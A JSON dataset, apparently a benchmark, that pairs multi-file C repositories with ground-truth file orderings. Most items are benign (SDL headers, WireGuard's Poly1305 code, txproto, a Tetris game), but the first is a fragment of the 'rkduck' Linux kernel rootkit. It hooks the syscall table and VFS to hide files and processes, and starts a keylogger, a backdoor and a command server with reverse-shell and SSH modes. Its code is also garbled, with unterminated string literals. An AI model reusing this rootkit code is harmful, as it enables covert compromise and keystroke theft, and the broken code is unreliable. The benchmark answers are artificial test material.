[
    {
        "files": [
            "'rkduck/rkduck/duck.h'",
            "'rkduck/rkduck/crumbs_serv.h'",
            "'rkduck/rkduck/duck.c'"
        ],
        "content": "'rkduck/rkduck/duck.h'\n:#ifndef _DUCK_H_\n#define _DUCK_H_\n\n#include \"backdoor.h\"\n#include \"common.h\"\n#include \"crumbs_serv.h\"\n#include \"list.h\"\n#include \"keylogger.h\"\n#include \"misc.h\"\n#include \"persistence.h\"\n#include \"syscalls.h\"\n#include \"vfs.h\"\n\nMODULE_LICENSE(\"GPL\");\n\nint duck_init(void);\nvoid duck_exit(void);\nmodule_init(duck_init);\nmodule_exit(duck_exit);\n\nasmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);\nint (*vfs_original_iterate)(struct file *, struct dir_context *);\nint (*vfs_original_filldir)(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);\n\nint (*vfs_original_proc_iterate)(struct file *, struct dir_context *);\nint (*vfs_original_proc_filldir)(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);\n\n#endif\n'rkduck/rkduck/crumbs_serv.h'\n:#ifndef _CURMBS_SERV_H_\n#define _CURMBS_SERV_H_\n\n\n#include \"common.h\"\n#include \"vfs.h\"\n\n#include <linux/workqueue.h>\n#include <net/sock.h>\n#include <linux/netlink.h>\n#include <linux/skbuff.h>\n#include <net/net_namespace.h>\n\n#define NETLINK_USER 31\n\ntypedef struct {\n    struct work_struct my_work;\n    char *dt;\n    int size;\n} my_work_t;\n\nstruct cmd_t {\n\tint id;\n\tchar* arg;\n};\n\ntypedef enum {\n\tAUTHENTICATION,\n\tHIDE_FILE,\n\tUNHIDE_FILE,\n\tHIDE_PROCESS,\n\tUNHIDE_PROCESS,\n\tMODE_SHELL,\n\tMODE_REVERSE_SHELL,\n\tACTIVATE_SSH,\n\tDEACTIVATE_SSH\n} commands;\n\nvoid crumbs_serv_init(void);\nvoid crumbs_serv_release(void);\n\n#endif\n'rkduck/rkduck/duck.c'\n:#include \"duck.h\"\n\nptr_t* sys_call_table = NULL;\nstruct hidden_file h_file;\n\nint duck_init(void) {\n    dbg(\"rkduck: loaded\\n\");\n\n    if ((sys_call_table = (ptr_t *) find_syscall_table())) {\n        dbg(\"rkduck: sys_call_table found at %p\\n\", sys_call_table);\n    } else {\n        dbg(\"rkduck: sys_call_table not found, aborting\\n\");\n        return 0;\n    }\n\n\n\n\n\n    vfs_hide_file(\"/root/rkduck/rkduck/rkduck_dir\");\n    vfs_hide_file(str_remove_duplicates(\"\n\n    printk(\"rkduck: %s\\n\", str_remove_duplicates(\"\n\n    vfs_original_iterate = vfs_get_iterate(\"/\");\n    vfs_save_hijacked_function_code(vfs_original_iterate, vfs_hijacked_iterate);\n    vfs_hijack_start(vfs_original_iterate);\n\n    vfs_original_proc_iterate = vfs_get_iterate(\"/proc\");\n    vfs_save_hijacked_function_code(vfs_original_proc_iterate, vfs_hijacked_proc_iterate);\n    vfs_hijack_start(vfs_original_proc_iterate);\n\n    keylogger_init();\n    crumbs_serv_init();\n    backdoor();\n\n\n    return 0;\n}\n\nvoid duck_exit(void) {\n\n    keylogger_release();\n    crumbs_serv_release();\n    backdoor_exit();\n\n    char *argv[] = { \"/bin/bash\", \"-c\", FOREVER_STOP, NULL };\n    char *envp[] = { \"HOME=/\", NULL };\n    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n\n\n\n    vfs_hijack_stop(vfs_original_iterate);\n    vfs_hijack_stop(vfs_original_proc_iterate);\n\n\n\n\n\n    dbg(\"rkduck: unloaded\\n\");\n}",
        "gt": [
            "'rkduck/rkduck/crumbs_serv.h'",
            "'rkduck/rkduck/duck.h'",
            "'rkduck/rkduck/duck.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_main.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_main.h'\n:\n\n#ifndef _SDL_main_h\n#define _SDL_main_h\n\n#include \"SDL_stdinc.h\"\n\n\n\n#ifndef SDL_MAIN_HANDLED\n#if defined(__WIN32__)\n\n#define SDL_MAIN_AVAILABLE\n\n#elif defined(__WINRT__)\n\n#define SDL_MAIN_NEEDED\n\n#elif defined(__IPHONEOS__)\n\n#define SDL_MAIN_NEEDED\n\n#elif defined(__ANDROID__)\n\n#define SDL_MAIN_NEEDED\n\n#elif defined(__NACL__)\n\n#define SDL_MAIN_NEEDED\n\n#endif\n#endif\n\n#ifdef __cplusplus\n#define C_LINKAGE   \"C\"\n#else\n#define C_LINKAGE\n#endif\n\n\n\n#if defined(SDL_MAIN_NEEDED) || defined(SDL_MAIN_AVAILABLE)\n#define main    SDL_main\n#endif\n\n\nextern C_LINKAGE int SDL_main(int argc, char *argv[]);\n\n\n#include \"begin_code.h\"\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nextern DECLSPEC void SDLCALL SDL_SetMainReady(void);\n\n#ifdef __WIN32__\n\n\nextern DECLSPEC int SDLCALL SDL_RegisterApp(char *name, Uint32 style,\n                                            void *hInst);\nextern DECLSPEC void SDLCALL SDL_UnregisterApp(void);\n\n#endif\n\n\n#ifdef __WINRT__\n\n\nextern DECLSPEC int SDLCALL SDL_WinRTRunApp(int (*mainFunction)(int, char **), void * reserved);\n\n#endif\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_compare_h\n#define _SDL_test_compare_h\n\n#include \"SDL.h\"\n\n#include \"SDL_test_images.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nint SDLTest_CompareSurfaces(SDL_Surface *surface, SDL_Surface *referenceSurface, int allowable_error);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_main.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'",
            "'wireguard-linux-compat/src/crypto/zinc/poly1305/poly1305.c'",
            "'wireguard-linux-compat/src/crypto/include/zinc/poly1305.h'"
        ],
        "content": "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n\n'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'\n:#ifndef _ARCH_ARM_ASM_NEON\n#define _ARCH_ARM_ASM_NEON\n#define kernel_neon_begin() \\\n\tBUILD_BUG_ON_MSG(1, \"This kernel does not support ARM NEON\")\n#define kernel_neon_end() \\\n\tBUILD_BUG_ON_MSG(1, \"This kernel does not support ARM NEON\")\n#endif\n\n'wireguard-linux-compat/src/crypto/zinc/poly1305/poly1305.c'\n:\n\n\n#include <zinc/poly1305.h>\n#include \"../selftest/run.h\"\n\n#include <asm/unaligned.h>\n#include <linux/kernel.h>\n#include <linux/string.h>\n#include <linux/module.h>\n#include <linux/init.h>\n\n#if defined(CONFIG_ZINC_ARCH_X86_64)\n#include \"poly1305-x86_64-glue.c\"\n#elif defined(CONFIG_ZINC_ARCH_ARM) || defined(CONFIG_ZINC_ARCH_ARM64)\n#include \"poly1305-arm-glue.c\"\n#elif defined(CONFIG_ZINC_ARCH_MIPS) || defined(CONFIG_ZINC_ARCH_MIPS64)\n#include \"poly1305-mips-glue.c\"\n#else\nstatic inline bool poly1305_init_arch(void *ctx,\n\t\t\t\t      const u8 key[POLY1305_KEY_SIZE])\n{\n\treturn false;\n}\nstatic inline bool poly1305_blocks_arch(void *ctx, const u8 *input,\n\t\t\t\t\tsize_t len, const u32 padbit,\n\t\t\t\t\tsimd_context_t *simd_context)\n{\n\treturn false;\n}\nstatic inline bool poly1305_emit_arch(void *ctx, u8 mac[POLY1305_MAC_SIZE],\n\t\t\t\t      const u32 nonce[4],\n\t\t\t\t      simd_context_t *simd_context)\n{\n\treturn false;\n}\nstatic bool *const poly1305_nobs[] __initconst = { };\nstatic void __init poly1305_fpu_init(void)\n{\n}\n#endif\n\n#if defined(CONFIG_ARCH_SUPPORTS_INT128) && defined(__SIZEOF_INT128__)\n#include \"poly1305-donna64.c\"\n#else\n#include \"poly1305-donna32.c\"\n#endif\n\nvoid poly1305_init(struct poly1305_ctx *ctx, const u8 key[POLY1305_KEY_SIZE])\n{\n\tctx->nonce[0] = get_unaligned_le32(&key[16]);\n\tctx->nonce[1] = get_unaligned_le32(&key[20]);\n\tctx->nonce[2] = get_unaligned_le32(&key[24]);\n\tctx->nonce[3] = get_unaligned_le32(&key[28]);\n\n\tif (!poly1305_init_arch(ctx->opaque, key))\n\t\tpoly1305_init_generic(ctx->opaque, key);\n\n\tctx->num = 0;\n}\n\nstatic inline void poly1305_blocks(void *ctx, const u8 *input, const size_t len,\n\t\t\t\t   const u32 padbit,\n\t\t\t\t   simd_context_t *simd_context)\n{\n\tif (!poly1305_blocks_arch(ctx, input, len, padbit, simd_context))\n\t\tpoly1305_blocks_generic(ctx, input, len, padbit);\n}\n\nstatic inline void poly1305_emit(void *ctx, u8 mac[POLY1305_KEY_SIZE],\n\t\t\t\t const u32 nonce[4],\n\t\t\t\t simd_context_t *simd_context)\n{\n\tif (!poly1305_emit_arch(ctx, mac, nonce, simd_context))\n\t\tpoly1305_emit_generic(ctx, mac, nonce);\n}\n\nvoid poly1305_update(struct poly1305_ctx *ctx, const u8 *input, size_t len,\n\t\t     simd_context_t *simd_context)\n{\n\tconst size_t num = ctx->num;\n\tsize_t rem;\n\n\tif (num) {\n\t\trem = POLY1305_BLOCK_SIZE - num;\n\t\tif (len < rem) {\n\t\t\tmemcpy(ctx->data + num, input, len);\n\t\t\tctx->num = num + len;\n\t\t\treturn;\n\t\t}\n\t\tmemcpy(ctx->data + num, input, rem);\n\t\tpoly1305_blocks(ctx->opaque, ctx->data, POLY1305_BLOCK_SIZE, 1,\n\t\t\t\tsimd_context);\n\t\tinput += rem;\n\t\tlen -= rem;\n\t}\n\n\trem = len % POLY1305_BLOCK_SIZE;\n\tlen -= rem;\n\n\tif (len >= POLY1305_BLOCK_SIZE) {\n\t\tpoly1305_blocks(ctx->opaque, input, len, 1, simd_context);\n\t\tinput += len;\n\t}\n\n\tif (rem)\n\t\tmemcpy(ctx->data, input, rem);\n\n\tctx->num = rem;\n}\n\nvoid poly1305_final(struct poly1305_ctx *ctx, u8 mac[POLY1305_MAC_SIZE],\n\t\t    simd_context_t *simd_context)\n{\n\tsize_t num = ctx->num;\n\n\tif (num) {\n\t\tctx->data[num++] = 1;\n\t\twhile (num < POLY1305_BLOCK_SIZE)\n\t\t\tctx->data[num++] = 0;\n\t\tpoly1305_blocks(ctx->opaque, ctx->data, POLY1305_BLOCK_SIZE, 0,\n\t\t\t\tsimd_context);\n\t}\n\n\tpoly1305_emit(ctx->opaque, mac, ctx->nonce, simd_context);\n\n\tmemzero_explicit(ctx, sizeof(*ctx));\n}\n\n#include \"../selftest/poly1305.c\"\n\nstatic bool nosimd __initdata = false;\n\n#ifndef COMPAT_ZINC_IS_A_MODULE\nint __init poly1305_mod_init(void)\n#else\nstatic int __init mod_init(void)\n#endif\n{\n\tif (!nosimd)\n\t\tpoly1305_fpu_init();\n\tif (!selftest_run(\"poly1305\", poly1305_selftest, poly1305_nobs,\n\t\t\t  ARRAY_SIZE(poly1305_nobs)))\n\t\treturn -ENOTRECOVERABLE;\n\treturn 0;\n}\n\n#ifdef COMPAT_ZINC_IS_A_MODULE\nstatic void __exit mod_exit(void)\n{\n}\n\nmodule_param(nosimd, bool, 0);\nmodule_init(mod_init);\nmodule_exit(mod_exit);\nMODULE_LICENSE(\"GPL v2\");\nMODULE_DESCRIPTION(\"Poly1305 one-time authenticator\");\nMODULE_AUTHOR(\"Jason A. Donenfeld <Jason@zx2c4.com>\");\n#endif\n\n'wireguard-linux-compat/src/crypto/include/zinc/poly1305.h'\n:\n\n\n#ifndef _ZINC_POLY1305_H\n#define _ZINC_POLY1305_H\n\n#include <linux/simd.h>\n#include <linux/types.h>\n\nenum poly1305_lengths {\n\tPOLY1305_BLOCK_SIZE = 16,\n\tPOLY1305_KEY_SIZE = 32,\n\tPOLY1305_MAC_SIZE = 16\n};\n\nstruct poly1305_ctx {\n\tu8 opaque[24 * sizeof(u64)];\n\tu32 nonce[4];\n\tu8 data[POLY1305_BLOCK_SIZE];\n\tsize_t num;\n} __aligned(8);\n\nvoid poly1305_init(struct poly1305_ctx *ctx, const u8 key[POLY1305_KEY_SIZE]);\nvoid poly1305_update(struct poly1305_ctx *ctx, const u8 *input, size_t len,\n\t\t     simd_context_t *simd_context);\nvoid poly1305_final(struct poly1305_ctx *ctx, u8 mac[POLY1305_MAC_SIZE],\n\t\t    simd_context_t *simd_context);\n\n#endif\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/poly1305.h'",
            "'wireguard-linux-compat/src/crypto/zinc/poly1305/poly1305.c'"
        ]
    },
    {
        "files": [
            "'txproto/src/include/libtxproto/txproto_main.h'",
            "'txproto/src/control.c'",
            "'txproto/src/cli.h'",
            "'txproto/src/include/libtxproto/control.h'"
        ],
        "content": "'txproto/src/include/libtxproto/txproto_main.h'\n:\n\n#pragma once\n\n#include <signal.h>\n#include <stdatomic.h>\n\n#include <libtxproto/log.h>\n#include <libtxproto/utils.h>\n\n#include \"version.h\"\n#include \"../config.h\"\n\ntypedef struct TXMainContext {\n    SPClass *class;\n\n    struct TXCLIContext *cli;\n    struct TXLuaContext *lua;\n\n    int lua_exit_code;\n\n    int source_update_cb_ref;\n\n    atomic_int_fast64_t epoch_value;\n\n    AVBufferRef **io_api_ctx;\n\n    SPBufferList *events;\n    SPBufferList *ext_buf_refs;\n} TXMainContext;\n\n#include \"cli.h\"\n#include \"lua_common.h\"\n\n'txproto/src/control.c'\n:\n\n#include \"../config.h\"\n\n#ifdef HAVE_INTERFACE\n#include \"interface_common.h\"\n#endif\n\n#include \"iosys_common.h\"\n\n#include <libtxproto/control.h>\n#include <libtxproto/commit.h>\n#include <libtxproto/encode.h>\n#include <libtxproto/decode.h>\n#include <libtxproto/mux.h>\n#include <libtxproto/filter.h>\n\nctrl_fn sp_get_ctrl_fn(void *ctx)\n{\n    enum SPType type = sp_class_get_type(ctx);\n    switch (type) {\n    case SP_TYPE_ENCODER:\n        return sp_encoder_ctrl;\n    case SP_TYPE_MUXER:\n        return sp_muxer_ctrl;\n    case SP_TYPE_DECODER:\n        return sp_decoder_ctrl;\n    case SP_TYPE_DEMUXER:\n        return sp_demuxer_ctrl;\n    case SP_TYPE_FILTER:\n        return sp_filter_ctrl;\n#ifdef HAVE_INTERFACE\n    case SP_TYPE_INTERFACE:\n        return sp_interface_ctrl;\n#endif\n    case SP_TYPE_AUDIO_SOURCE:\n    case SP_TYPE_AUDIO_SINK:\n    case SP_TYPE_AUDIO_BIDIR:\n    case SP_TYPE_VIDEO_SOURCE:\n    case SP_TYPE_VIDEO_SINK:\n    case SP_TYPE_VIDEO_BIDIR:\n    case SP_TYPE_SUB_SOURCE:\n    case SP_TYPE_SUB_SINK:\n    case SP_TYPE_SUB_BIDIR:\n        return ((IOSysEntry *)ctx)->ctrl;\n    default:\n        break;\n    }\n    return NULL;\n}\n\nint sp_generic_ctrl(TXMainContext *ctx,\n                    AVBufferRef *ref,\n                    SPEventType flags,\n                    void *arg)\n{\n    int err;\n\n    ctrl_fn fn = sp_get_ctrl_fn(ref->data);\n    if (!fn) {\n        sp_log(ctx, SP_LOG_ERROR, \"Unsupported CTRL type: %s!\",\n               sp_class_type_string(ref->data));\n        return AVERROR(EINVAL);\n    }\n\n    if (!(flags & SP_EVENT_CTRL_MASK)) {\n        sp_log(ctx, SP_LOG_ERROR, \"Missing ctrl: command: %s!\",\n               av_err2str(AVERROR(EINVAL)));\n        return AVERROR(EINVAL);\n    } else if (flags & SP_EVENT_ON_MASK) {\n        sp_log(ctx, SP_LOG_ERROR, \"Event specified but given to a ctrl, use %s.schedule: %s!\",\n               sp_class_get_name(ref->data), av_err2str(AVERROR(EINVAL)));\n        return AVERROR(EINVAL);\n    } else if ((flags & SP_EVENT_CTRL_OPTS) && (!arg)) {\n        sp_log(ctx, SP_LOG_ERROR, \"No options specified for ctrl:opts: %s!\",\n               av_err2str(AVERROR(EINVAL)));\n        return AVERROR(EINVAL);\n    }\n\n    if (flags & SP_EVENT_CTRL_START)\n        err = fn(ref, flags, &ctx->epoch_value);\n    else\n        err = fn(ref, flags, arg);\n    if (err < 0) {\n        sp_log(ctx, SP_LOG_ERROR, \"Unable to process CTRL: %s\",\n               av_err2str(err));\n        return AVERROR(EINVAL);\n    }\n\n    if (!(flags & SP_EVENT_FLAG_IMMEDIATE))\n        sp_add_commit_fn_to_list(ctx, fn, ref);\n\n    return 0;\n}\n\n'txproto/src/cli.h'\n:\n\n#pragma once\n\n#include <libtxproto/txproto_main.h>\n\ntypedef struct TXCLIContext TXCLIContext;\n\n\nint sp_cli_init(TXCLIContext **s, TXMainContext *ctx);\n\n\nint sp_cli_prompt_event(TXCLIContext *cli_ctx, AVBufferRef *event, const char *msg);\n\n\nvoid sp_cli_uninit(TXCLIContext **s);\n\n'txproto/src/include/libtxproto/control.h'\n:\n\n#pragma once\n\n#include <libtxproto/txproto_main.h>\n\nctrl_fn sp_get_ctrl_fn(void *ctx);\n\nint sp_generic_ctrl(TXMainContext *ctx,\n                    AVBufferRef *ref,\n                    SPEventType flags,\n                    void *arg);\n",
        "gt": [
            "'txproto/src/cli.h'",
            "'txproto/src/include/libtxproto/txproto_main.h'",
            "'txproto/src/include/libtxproto/control.h'",
            "'txproto/src/control.c'"
        ]
    },
    {
        "files": [
            "'tetris-sdl-c/src/sds.h'",
            "'tetris-sdl-c/src/defs.h'",
            "'tetris-sdl-c/src/input.c'",
            "'tetris-sdl-c/src/input.h'"
        ],
        "content": "'tetris-sdl-c/src/sds.h'\n:\n\n#ifndef __SDS_H\n#define __SDS_H\n\n#define SDS_MAX_PREALLOC (1024*1024)\n\n#include <sys/types.h>\n#include <stdarg.h>\n\ntypedef char *sds;\n\nstruct sdshdr {\n    int len;\n    int free;\n    char buf[];\n};\n\nstatic inline size_t sdslen(const sds s) {\n    struct sdshdr *sh = (void*)(s-sizeof *sh);\n    return sh->len;\n}\n\nstatic inline size_t sdsavail(const sds s) {\n    struct sdshdr *sh = (void*)(s-sizeof *sh);\n    return sh->free;\n}\n\nsds sdsnewlen(const void *init, size_t initlen);\nsds sdsnew(const char *init);\nsds sdsempty(void);\nsize_t sdslen(const sds s);\nsds sdsdup(const sds s);\nvoid sdsfree(sds s);\nsize_t sdsavail(const sds s);\nsds sdsgrowzero(sds s, size_t len);\nsds sdscatlen(sds s, const void *t, size_t len);\nsds sdscat(sds s, const char *t);\nsds sdscatsds(sds s, const sds t);\nsds sdscpylen(sds s, const char *t, size_t len);\nsds sdscpy(sds s, const char *t);\n\nsds sdscatvprintf(sds s, const char *fmt, va_list ap);\n#ifdef __GNUC__\nsds sdscatprintf(sds s, const char *fmt, ...)\n    __attribute__((format(printf, 2, 3)));\n#else\nsds sdscatprintf(sds s, const char *fmt, ...);\n#endif\n\nvoid sdstrim(sds s, const char *cset);\nvoid sdsrange(sds s, int start, int end);\nvoid sdsupdatelen(sds s);\nvoid sdsclear(sds s);\nint sdscmp(const sds s1, const sds s2);\nsds *sdssplitlen(const char *s, int len, const char *sep, int seplen, int *count);\nvoid sdsfreesplitres(sds *tokens, int count);\nvoid sdstolower(sds s);\nvoid sdstoupper(sds s);\nsds sdsfromlonglong(long long value);\nsds sdscatrepr(sds s, const char *p, size_t len);\nsds *sdssplitargs(const char *line, int *argc);\nsds sdsmapchars(sds s, const char *from, const char *to, size_t setlen);\nsds sdsjoin(char **argv, int argc, char *sep, size_t seplen);\nsds sdsjoinsds(sds *argv, int argc, const char *sep, size_t seplen);\n\n\nsds sdsMakeRoomFor(sds s, size_t addlen);\nvoid sdsIncrLen(sds s, int incr);\nsds sdsRemoveFreeSpace(sds s);\nsize_t sdsAllocSize(sds s);\n\n#endif\n\n'tetris-sdl-c/src/defs.h'\n:#include <stdio.h>\n#include <string.h>\n#include <stdint.h>\n#include <stdlib.h>\n#include <time.h>\n#include <assert.h>\n#include <stdbool.h>\n#include \"sds.h\"\n#include \"SDL2/SDL.h\"\n#include \"SDL2/SDL_ttf.h\"\n#include \"SDL2_gfxPrimitives.h\"\n\n#ifndef _GLOBAL_CONSTANTS\n#define _GLOBAL_CONSTANTS\n\n#define WINDOW_TITLE \"tetris-sdl-c\"\n\n\n#define BLOCK_SIZE 20\n\n\n#define PLAYFIELD_HEIGHT 22\n#define PLAYFIELD_WIDTH 10\n\n#define WINDOW_HEIGHT PLAYFIELD_HEIGHT * (BLOCK_SIZE + 1) + 1\n#define WINDOW_WIDTH PLAYFIELD_WIDTH * (BLOCK_SIZE + 1) + 1\n\n#endif\n\n'tetris-sdl-c/src/input.c'\n:#include \"input.h\"\n\nvoid getInput() {\n    SDL_Event event;\n\n\n\n    while (SDL_PollEvent(&event)) {\n        switch (event.type) {\n\n\n            case SDL_QUIT:\n                exit(0);\n            break;\n\n            case SDL_KEYDOWN:\n                switch (event.key.keysym.sym) {\n                    case SDLK_ESCAPE:\n                        exit(0);\n                    break;\n\n                    case SDLK_s:\n                    case SDLK_DOWN:\n                        TETROMINO_ACTION = DOWN;\n                    break;\n\n                    case SDLK_d:\n                    case SDLK_RIGHT:\n                        TETROMINO_ACTION = RIGHT;\n                    break;\n\n                    case SDLK_a:\n                    case SDLK_LEFT:\n                        TETROMINO_ACTION = LEFT;\n                    break;\n\n                    case SDLK_w:\n                    case SDLK_UP:\n                        TETROMINO_ACTION = ROTATE;\n                    break;\n\n                    case SDLK_r:\n                        TETROMINO_ACTION = RESTART;\n                    break;\n\n                    case SDLK_SPACE:\n                        TETROMINO_ACTION = DROP;\n                    break;\n\n                    default:\n                    break;\n                }\n            break;\n\n            case SDL_KEYUP:\n                TETROMINO_ACTION = NONE;\n            break;\n\n            case SDL_USEREVENT:\n                TETROMINO_ACTION = AUTO_DROP;\n            break;\n\n            default:\n            break;\n        }\n    }\n}\n\n'tetris-sdl-c/src/input.h'\n:#include \"defs.h\"\n#include \"tetris.h\"\n\nTetris_Action TETROMINO_ACTION;\n\nvoid getInput();\n",
        "gt": [
            "'tetris-sdl-c/src/sds.h'",
            "'tetris-sdl-c/src/defs.h'",
            "'tetris-sdl-c/src/input.h'",
            "'tetris-sdl-c/src/input.c'"
        ]
    },
    {
        "files": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/oa.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'",
            "'KFDtool/fw/KFDtool/InfoData.c'"
        ],
